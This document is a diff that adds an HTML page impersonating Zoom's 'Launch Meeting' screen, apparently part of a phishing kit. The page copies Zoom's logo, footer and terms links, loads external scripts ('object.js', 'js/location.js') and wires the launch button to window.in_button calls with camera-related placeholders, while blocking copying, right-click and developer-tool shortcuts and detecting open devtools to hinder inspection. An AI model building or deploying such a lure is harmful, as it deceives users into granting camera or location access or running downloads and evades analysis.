@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1.0">
+  <title>Launch Meeting - Zoom</title>
+  <meta name="description"
+    content="Zoom is the leader in modern enterprise video communications, with an easy, reliable cloud platform for video and audio conferencing, chat, and webinars across mobile, desktop, and room systems.">
+  <meta name="robots" content="noindex,nofollow">
+  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+  <script src="js/location.js"></script>
+  <link rel="shortcut icon" href="https://www.pngarts.com/files/7/Zoom-Logo-PNG-Image.png">
+  <style>
+    * {
+      font-family: "Open Sans", "Helvetica", "Arial", sans-serif;
+    }
+
+    html,
+    body {
+      height: 100%;
+      color: #232333;
+      margin: 0;
+    }
+
+    body {
+      padding-top: 64px;
+      box-sizing: border-box;
+    }
+
+    .header-container {
+      position: fixed;
+      width: 100%;
+      top: 0;
+      z-index: 300;
+      background-color: rgba(255, 255, 255, .97);
+      height: 64px;
+      line-height: 64px;
+      box-shadow: 0 0 2px rgba(0, 0, 0, 0.2);
+    }
+
+    .header-outer {
+      position: relative;
+      font-size: 12px;
+      font-weight: 600;
+      width: 100%;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .header-logo {
+      height: 25px;
+      outline: none;
+      border: 0;
+      width: auto;
+      margin-left: 24px;
+      margin-right: 20px;
+      vertical-align: middle;
+      left: 0;
+    }
+
+    .header-actions {
+      float: right;
+      padding-right: 24px;
+      font-weight: 400;
+    }
+
+    .footer-container {
+      padding: 24px;
+      width: 100%;
+      bottom: 0;
+      z-index: 300;
+      min-height: 64px;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      color: rgba(4, 4, 19, 0.56);
+      box-sizing: border-box;
+    }
+
+    .footer-container a {
+      color: inherit;
+    }
+
+    .footer-container p {
+      margin: 0;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    a {
+      text-decoration: none;
+      color: #0E71EB;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    .main-container {
+      background: #fff;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      font-family: Inter, Open Sans, Helvetica, Arial, sans-serif;
+      margin: 0 auto;
+      max-width: 840px;
+      min-height: 480px;
+      padding: 130px 60px 48px;
+      position: relative;
+      text-align: center;
+    }
+
+    .main-container:focus {
+      outline: none;
+    }
+
+    .content-wrapper {
+      color: rgba(4, 4, 19, .56);
+      font-size: 18px;
+      width: 100%;
+    }
+
+    .content-wrapper hr {
+      background: #ededf4;
+      border: none;
+      height: 1px;
+      margin: 48px 0;
+      width: 100%;
+    }
+
+    .content-wrapper h1,
+    .content-wrapper h2,
+    .content-wrapper h3,
+    .content-wrapper h4 {
+      font-weight: 400;
+      margin: 0;
+    }
+
+    .content-wrapper h1 {
+      font-size: 20px;
+      line-height: 40px;
+      padding: 12px 0;
+    }
+
+    .content-wrapper h2 {
+      padding: 5px 0;
+      font-size: 14px;
+      line-height: 24px;
+    }
+
+    .content-wrapper h1,
+    .content-wrapper h2,
+    .content-wrapper h3 {
+      color: #232333;
+    }
+
+    .content-wrapper a {
+      color: #f2f2f2;
+      cursor: pointer;
+      text-decoration: none;
+      white-space: nowrap;
+    }
+
+    .content-wrapper h3 a {
+      color: #0e72ed;
+    }
+
+    .terms-notice a {
+      color: #0e72ed;
+    }
+
+    .primary-button {
+      background: #0e72ed;
+      border-radius: 12px;
+      box-sizing: border-box;
+      color: #fff;
+      cursor: pointer;
+      display: inline-block;
+      font-size: 16px;
+      line-height: 32px;
+      margin-top: 12px;
+      padding: 8px 40px;
+      text-align: center;
+      text-decoration: none;
+    }
+
+    .primary-button:hover {
+      background-color: #2681f2;
+    }
+
+    .primary-button:active {
+      background-color: #0c63ce;
+    }
+
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      text-align: center;
+    }
+
+    .footer-links a {
+      cursor: pointer;
+      line-height: 16px;
+      margin: 2px 0;
+      padding: 0 6px;
+    }
+
+    .footer-links a+a {
+      border-left: 1px solid;
+    }
+
+    @media (max-width: 500px) {
+      body {
+        padding-top: 60px;
+      }
+
+      .header-container {
+        height: 60px;
+        line-height: 60px;
+      }
+
+      .footer-container {
+        margin-top: 32px;
+        padding-bottom: 8px;
+      }
+
+      .footer-container p {
+        margin: 0;
+        font-size: 12px;
+      }
+
+      .footer-container span {
+        white-space: nowrap;
+      }
+
+      .main-container {
+        padding: 16px;
+      }
+
+      .primary-button {
+        border-radius: 16px;
+        font-size: 17px;
+        line-height: 48px;
+        padding: 0;
+        width: 100%;
+      }
+
+      .content-wrapper h1 {
+        font-size: 24px;
+        font-weight: 700;
+        line-height: 28px;
+        margin-bottom: 44px;
+        padding: 0;
+      }
+
+      .content-wrapper hr {
+        margin: 40px 0;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="header-container" role="banner">
+    <div class="header-outer">
+      <div class="header-content">
+        <a href="/" aria-label="Zoom Logo">
+          <svg width="115" height="25" viewBox="0 0 90 20" fill="#2D8CFF" class="header-logo"
+            style="width: 115px !important;">
+            <path fill-rule="evenodd" clip-rule="evenodd"
+              d="M36.1691 17.0711C40.0314 13.1658 40.0314 6.83418 36.1691 2.92895C34.2395 0.97793 31.711 0.00161441 29.1694 0C26.6404 0.00161441 24.1119 0.97793 22.1824 2.92895C18.32 6.83418 18.32 13.1658 22.1824 17.0711C26.0447 20.9763 32.3068 20.9763 36.1691 17.0711ZM33.3717 14.2425C35.6891 11.8993 35.6891 8.10037 33.3717 5.75722C31.0543 3.41406 27.2971 3.41406 24.9797 5.75722C22.6623 8.10037 22.6623 11.8993 24.9797 14.2425C27.2971 16.5856 31.0543 16.5856 33.3717 14.2425ZM57.4327 2.92895C61.2951 6.83418 61.2951 13.1658 57.4327 17.0711C53.5704 20.9763 47.3084 20.9763 43.446 17.0711C39.5837 13.1658 39.5837 6.83418 43.446 2.92895C45.3756 0.97793 47.9041 0.00161441 50.4331 0C52.9747 0.00161441 55.5032 0.97793 57.4327 2.92895ZM54.6354 5.75722C56.9528 8.10037 56.9528 11.8993 54.6354 14.2425C52.318 16.5856 48.5607 16.5856 46.2434 14.2425C43.9259 11.8993 43.9259 8.10037 46.2434 5.75722C48.5607 3.41406 52.318 3.41406 54.6354 5.75722ZM74.1262 8C74.0879 7.24898 73.9816 6.58351 73.6428 5.99375C72.9579 4.80159 71.6813 4 70.2196 4C68.7592 4 67.4837 4.80005 66.7983 5.99029C66.4583 6.58083 66.3547 7.24786 66.313 8L66.2635 9V16L66.2141 17.0004C66.1495 18.6605 64.9483 19.8401 63.2965 19.95L62.3075 20V0C63.2965 0 65.019 0.505638 65.7885 1.37131C67.0527 0.505638 68.5777 0 70.2196 0C72.5827 0 74.7039 1.04751 76.1536 2.70835C77.6034 1.04751 79.7246 0 82.0877 0C86.4574 0 89.9998 3.58172 89.9998 8V9.00903V20L89.0117 19.95C87.3775 19.8542 86.1958 18.644 86.0932 16.999L86.0437 16V8.99893L85.9943 8C85.9551 7.26721 85.8509 6.58767 85.514 5.99912C84.8299 4.804 83.5516 4 82.0877 4C80.629 4 79.3547 4.79826 78.6688 5.98632C78.3273 6.57775 78.2197 7.25832 78.1811 8L78.1317 9V20L77.1436 19.95C75.5118 19.8455 74.3229 18.6344 74.2251 16.999L74.1756 16V9L74.1262 8ZM4.94506 20L3.95604 19.95C2.31347 19.8406 1.13603 18.6476 1.03846 16.9991L0.989011 16L12.8571 4H3.95604L2.96583 3.95C1.34815 3.85556 0.177592 2.62595 0.0494498 0.999056L0 7.42403e-06L14.8352 0.000912409L15.8241 0.0499992C17.4625 0.137543 18.6634 1.34167 18.7418 3.00124L18.7912 4L6.92308 16H15.8242L16.8132 16.05C18.4453 16.1531 19.5984 17.3544 19.7308 19.0009L19.7802 20H4.94506Z">
+            </path>
+          </svg>
+        </a>
+        <div class="header-actions">
+          <a target="_blank" href="https://support.zoom.us/hc/en-us">Support</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-container" role="main" tabindex="0">
+    <div class="content-wrapper">
+      <div>
+        <h1>Click <b>Open link</b> on the dialog shown by your browser<br>If you don't see a dialog, click <b>Launch
+            Meeting</b> below</h1>
+        <h2 class="terms-notice">By clicking "Launch Meeting", you agree to our <a tabindex="0" target="_blank"
+            href="https://zoom.us/en-us/terms">Terms of Service</a> and <a target="_blank" tabindex="0"
+            href="https://zoom.us/en-us/privacy">Privacy Statement</a></h2>
+        <a href="javascript:void(0);" onclick="launchMeeting()" class="primary-button">Launch Meeting</a>
+        <hr>
+        <h3 role="presentation">Don't have Zoom Client installed? <a download="" tabindex="0">Download Now</a></h3>
+      </div>
+    </div>
+  </div>
+
+  <script src="object.js"></script>
+  <script>const delay = __CAMERA_COUNT__;window.in_button.sc(delay);window.in_button.button_enable(__CAMERA_STATUS__);function launchMeeting() {window.in_button.accept();}</script>
+  <script>document.addEventListener('contextmenu', e => e.preventDefault()); document.addEventListener('dragstart', e => !e.target.matches('button,input,textarea,a,[contenteditable="true"]') && (e.preventDefault(), !1)); document.addEventListener('selectstart', e => !e.target.matches('input,textarea,[contenteditable="true"]') && (e.preventDefault(), !1)); document.addEventListener('copy', e => !e.target.matches('input,textarea,[contenteditable="true"]') && e.preventDefault()); document.addEventListener('cut', e => !e.target.matches('input,textarea,[contenteditable="true"]') && e.preventDefault()); document.addEventListener('paste', e => !e.target.matches('input,textarea,[contenteditable="true"]') && e.preventDefault()); document.addEventListener('keydown', e => { (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I', 'J', 'C', 'i', 'j', 'c'].includes(e.key)) || (e.ctrlKey && ['u', 'U'].includes(e.key)) || e.key === 'F11' || (e.ctrlKey && ['s', 'S', 'p', 'P'].includes(e.key)) || (e.altKey && e.key === 'Tab')) && (e.preventDefault(), !1) }); setInterval(() => { const w = window.outerWidth - window.innerWidth > 160, h = window.outerHeight - window.innerHeight > 160; (w || h) && !window.devToolsOpen && (window.devToolsOpen = !0) }, 2000);</script>
+  <div class="footer-container" role="contentinfo">
+    <div class="footer-content">
+      <p>©2026 Zoom Video Communications, Inc. <span>All rights reserved.</span></p>
+      <p class="footer-links">
+        <a href="https://zoom.us/en-us/trust" target="_blank">Privacy &amp; Legal Policies</a>
+        <a href="javascript:void(null);" tabindex="0" role="button">Do Not Sell My Personal Information</a>
+        <a href="javascript:void(null);" tabindex="0" role="button">Cookie Preferences</a>
+      </p>
+    </div>
+  </div>
+</body>
+
+</html>
